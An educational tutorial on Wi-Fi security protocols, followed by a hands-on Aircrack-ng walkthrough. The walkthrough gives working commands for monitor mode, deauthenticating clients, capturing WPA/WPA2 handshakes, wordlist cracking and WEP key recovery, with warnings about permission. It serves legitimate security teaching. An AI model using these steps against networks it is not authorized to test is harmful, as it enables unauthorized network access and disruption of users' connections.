# Wireless Security & Wi-Fi Hacking Basics

**Wireless security** refers to all the measures, protocols, and practices put in place to protect wireless networks and the data transmitted over them from unauthorized access, use, disclosure, alteration, or destruction.

When data is transmitted over Wi-Fi, it travels as radio waves, making it potentially accessible to anyone nearby with the appropriate equipment. Without security, this could lead to:

*   **Eavesdropping:** Intercepting and reading your internet traffic.
*   **Unauthorized Access:** Gaining entry to your network and connected devices.
*   **Data Injection/Disruption:** Introducing malicious data or interfering with your connection.
*   **Unauthorized Use of Connection:** Others using your internet, potentially for illicit activities.

Effective wireless security aims to provide:
1.  **Confidentiality:** Ensuring data is unreadable to unauthorized parties (via encryption).
2.  **Integrity:** Guaranteeing data has not been tampered with during transmission.
3.  **Availability:** Keeping the network accessible to legitimate users.
4.  **Authentication:** Verifying the identity of users and devices connecting to the network.

## Understanding Wi-Fi security protocols (WEP, WPA, WPA2)

Wi-Fi security protocols are crucial for protecting wireless networks from unauthorized access and eavesdropping. Over the years, several protocols have been developed, each with varying levels of security.

### WEP (Wired Equivalent Privacy)
*   **Overview:** The original security algorithm for IEEE 802.11 wireless networks. Introduced in 1999, its goal was to provide data confidentiality comparable to that of a traditional wired network.
*   **Encryption:** Uses the RC4 stream cipher.
*   **Key Sizes:** Typically 64-bit (40-bit key + 24-bit Initialization Vector - IV) or 128-bit (104-bit key + 24-bit IV).
*   **Vulnerabilities:**
    *   **Short IVs (24-bit):** Leads to IV reuse, especially on busy networks. This reuse allows attackers to collect packets with the same IV, which can be used to derive the key.
    *   **Weak RC4 Implementation:** Certain IVs are considered "weak" and can leak information about the key.
    *   **No Key Management:** Keys are static and manually configured on the AP and clients.
    *   **No Integrity Check:** WEP uses CRC-32 for integrity, which is not cryptographically secure and can be manipulated.
    *   **Authentication Flaws:** Both Open System and Shared Key authentication methods are flawed. Shared Key authentication is particularly vulnerable as it involves the AP sending a challenge text encrypted with the WEP key, which an attacker can capture and use.
*   **Status:** **Deprecated and highly insecure.** WEP keys can often be cracked in minutes using tools like Aircrack-ng. It should not be used.

### WPA (Wi-Fi Protected Access)
*   **Overview:** Introduced in 2003 by the Wi-Fi Alliance as an interim solution to address the serious flaws in WEP, while new hardware supporting WPA2 was being developed. It was designed to run on most WEP-capable hardware through firmware upgrades.
*   **Encryption:** Still uses RC4 like WEP, but with significant improvements.
*   **Key Management & Integrity:**
    *   **TKIP (Temporal Key Integrity Protocol):**
        *   Dynamically generates a new 128-bit key for each packet.
        *   Includes a **Message Integrity Check (MIC)**, called "Michael," to protect against packet forgery and tampering. If two MIC failures occur within 60 seconds, the AP will typically shut down for a period or rekey.
        *   Implements a sequence counter to protect against replay attacks.
*   **Authentication:**
    *   **WPA-Personal (WPA-PSK):** Uses a Pre-Shared Key (password) between 8 and 63 ASCII characters.
    *   **WPA-Enterprise (WPA-802.1X):** Uses an authentication server (typically RADIUS) for more robust, per-user authentication.
*   **Vulnerabilities:**
    *   While much stronger than WEP, TKIP still has some underlying weaknesses due to its RC4 foundation.
    *   Susceptible to some denial-of-service attacks related to the MIC.
    *   If Wi-Fi Protected Setup (WPS) is enabled and has a vulnerable PIN implementation, WPA-PSK can be compromised.
*   **Status:** **Considered insecure and deprecated.** While better than WEP, it has known vulnerabilities and has been superseded by WPA2 and WPA3.

### WPA2 (Wi-Fi Protected Access II)
*   **Overview:** Introduced in 2004, WPA2 is the full implementation of the IEEE 802.11i security standard. It became mandatory for Wi-Fi certified devices in 2006.
*   **Encryption & Integrity:**
    *   **AES (Advanced Encryption Standard):** A much stronger and more robust encryption algorithm than RC4.
    *   **CCMP (Counter Mode Cipher Block Chaining Message Authentication Code Protocol):** This protocol uses AES for both encryption and integrity, providing a significant security improvement over TKIP.
*   **Authentication:**
    *   **WPA2-Personal (WPA2-PSK):** Uses a Pre-Shared Key. The security heavily relies on the strength and secrecy of this passphrase.
    *   **WPA2-Enterprise (WPA2-802.1X):** Uses an authentication server (e.g., RADIUS) for individual user credentials and more granular control.
*   **Vulnerabilities:**
    *   **Weak PSK:** The most common vulnerability is a weak or easily guessable pre-shared key, susceptible to dictionary or brute-force attacks on the captured 4-way handshake.
    *   **KRACK (Key Reinstallation Attack):** Discovered in 2017, this attack exploits a flaw in the WPA2 4-way handshake, allowing an attacker to reinstall an already-in-use key. This could potentially lead to packet decryption, injection, and TCP connection hijacking. Patches have been widely deployed.
    *   **WPS Vulnerabilities:** Similar to WPA, if WPS is enabled and vulnerable, WPA2-PSK can be compromised.
*   **Status:** **Widely used and generally secure, especially WPA2-Enterprise.** For WPA2-Personal, using a strong, long, and unique passphrase is critical. PMF (Protected Management Frames, 802.11w) can enhance security by protecting management frames from forgery.

### WPA3 (Wi-Fi Protected Access III)
*   **Overview:** Introduced in 2018, WPA3 is the latest generation of Wi-Fi security, bringing significant improvements.
*   **Key Enhancements:**
    *   **SAE (Simultaneous Authentication of Equals):** Replaces PSK in WPA3-Personal. It's based on the Dragonfly handshake and is resistant to offline dictionary attacks, even if the password is weak. It also provides forward secrecy.
    *   **Stronger Encryption for Enterprise:** WPA3-Enterprise offers an optional 192-bit cryptographic strength mode (CNSA suite) for sensitive environments.
    *   **Protected Management Frames (PMF):** Mandatory in WPA3, providing improved protection against deauthentication and disassociation attacks.
    *   **Wi-Fi Easy Connect™:** Simplifies the process of onboarding IoT devices without displays or input mechanisms to a Wi-Fi network securely.
    *   **Enhanced Open™ (Opportunistic Wireless Encryption - OWE):** Provides individualized data encryption in open (public) Wi-Fi networks, protecting users from passive eavesdropping without requiring a password.
*   **Status:** **The most secure current standard.** Adoption is growing as new devices and routers support it. Offers significant security advantages over WPA2.

## Hands-on: Testing Wi-Fi security with Aircrack-ng

Aircrack-ng is a comprehensive suite of tools used to assess Wi-Fi network security. It can be used for monitoring, attacking, testing, and cracking Wi-Fi networks. **Always ensure you have explicit permission before testing any network that you do not own.**

### Core Components of the Aircrack-ng Suite:
*   **`airmon-ng`**: Manages wireless network interfaces, primarily used to enable and disable monitor mode.
*   **`airodump-ng`**: Captures 802.11 frames. Used for discovering networks, collecting IVs (for WEP), and capturing WPA/WPA2 handshakes.
*   **`aireplay-ng`**: Injects wireless frames. Used for various attacks like deauthentication, fake authentication, ARP replay (for WEP), etc.
*   **`aircrack-ng`**: The actual cracking tool. Used to crack WEP keys and WPA/WPA2-PSK passphrases using captured data.
*   **`airdecap-ng`**: Decrypts WEP or WPA/WPA2 encrypted capture files given the correct key.
*   Other tools include `airbase-ng` (for creating rogue APs), `packetforge-ng` (for creating custom encrypted packets), etc.

### Prerequisites:
1.  **Compatible Wireless Adapter:** The adapter must support monitor mode and, for some attacks, packet injection. Not all wireless cards do. Common chipsets like Atheros, Ralink, and some Realtek are often compatible.
2.  **Linux Environment:** Aircrack-ng is primarily designed for Linux. Kali Linux comes with Aircrack-ng pre-installed and drivers for many common wireless adapters.
3.  **Root Privileges:** Most Aircrack-ng tools require root privileges to operate.

### General Workflow for WPA/WPA2-PSK Cracking:

**Step 1: Enable Monitor Mode**
   *   Identify your wireless interface (e.g., `wlan0`): `iwconfig` or `ip link show`
   *   Kill interfering processes: `sudo airmon-ng check kill`
   *   Start monitor mode on the interface: `sudo airmon-ng start wlan0`
     This will create a new monitor interface, often named `wlan0mon` or `mon0`.

**Step 2: Discover Target Networks**
   *   Scan for available Wi-Fi networks: `sudo airodump-ng wlan0mon`
   *   Note the **BSSID** (MAC address of the target AP), **CH** (channel), and **ESSID** (network name) of the target network.

**Step 3: Capture the 4-Way Handshake**
   *   Focus `airodump-ng` on the target network to capture the handshake:
     `sudo airodump-ng -c [CH] --bssid [BSSID] -w [capture_file_prefix] wlan0mon`
     (e.g., `sudo airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w MyCapture wlan0mon`)
   *   A 4-way handshake occurs when a client authenticates to the WPA/WPA2-PSK network. You need to wait for a client to connect or reconnect.
   *   **Optional: Deauthenticate a Client to Speed Up Handshake Capture**
     If a client is already connected, you can send deauthentication packets to force it to reconnect, thus generating a new handshake.
     First, identify a connected client's MAC address (STATION column in `airodump-ng`).
     `sudo aireplay-ng -0 1 -a [BSSID_of_AP] -c [MAC_of_Client] wlan0mon`
     (e.g., `sudo aireplay-ng -0 1 -a 00:11:22:33:44:55 -c AA:BB:CC:DD:EE:FF wlan0mon`)
     The `-0` specifies a deauthentication attack, and `1` is the number of deauth packets to send.
   *   `airodump-ng` will display "WPA handshake: [BSSID]" in the top right corner when a handshake is successfully captured. The capture file (e.g., `MyCapture-01.cap`) will contain this handshake.

**Step 4: Crack the Passphrase**
   *   Use `aircrack-ng` with a wordlist to attempt to crack the PSK from the captured handshake:
     `aircrack-ng -w /path/to/your/wordlist.txt -b [BSSID] [capture_file_prefix]*.cap`
     (e.g., `aircrack-ng -w /usr/share/wordlists/rockyou.txt -b 00:11:22:33:44:55 MyCapture-01.cap`)
   *   The success of this step depends heavily on the strength of the PSK and the quality/completeness of your wordlist. Brute-forcing complex passwords can take an extremely long time.

### Notes on WEP Cracking (Largely Academic):
1.  Enable monitor mode and discover the WEP network as above.
2.  Use `airodump-ng` to collect IVs (Initialization Vectors):
    `sudo airodump-ng -c [CH] --bssid [BSSID_WEP] -w WEP_Capture wlan0mon`
3.  Wait for the `#Data` count in `airodump-ng` to increase. For WEP, you typically need tens of thousands to hundreds of thousands of IVs.
4.  Optionally, use `aireplay-ng` attacks (like ARP replay: `aireplay-ng -3 ...`) to generate more IVs faster if a client is associated.
5.  Once enough IVs are collected, run `aircrack-ng WEP_Capture-01.cap`. It often finds the key relatively quickly.

### Ethical Considerations and Legality:
*   **Permission is paramount.** Unauthorized access to or testing of wireless networks is illegal in most jurisdictions and unethical.
*   These tools should only be used on networks you own or have explicit, written permission to test.
*   The purpose of learning these techniques should be for defensive security (understanding how to protect networks) or professional penetration testing with proper authorization.